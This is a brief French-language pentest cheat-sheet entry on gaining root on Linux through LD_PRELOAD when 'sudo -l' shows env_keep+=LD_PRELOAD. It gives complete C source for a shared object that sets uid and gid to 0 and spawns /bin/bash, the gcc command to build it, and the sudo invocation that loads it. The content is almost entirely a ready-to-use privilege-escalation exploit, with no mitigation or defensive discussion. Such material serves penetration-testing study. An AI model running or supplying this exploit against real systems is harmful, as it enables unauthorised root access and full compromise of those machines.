# LD\_PRELOAD

## LD\_PRELOAD

En faisant un "sudo -l", si "env\_keep+=LD\_PRELOAD" est présent et que nous pouvons exécuter une commande avec un droit sudo, alors il est possible de faire une escalade de privilège.

```bash
nano -w /tmp/root.c
```

Contenu de root.c:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Puis le compiler:

```bash
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
```

Puis lancer la commande:

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/executable restart
```
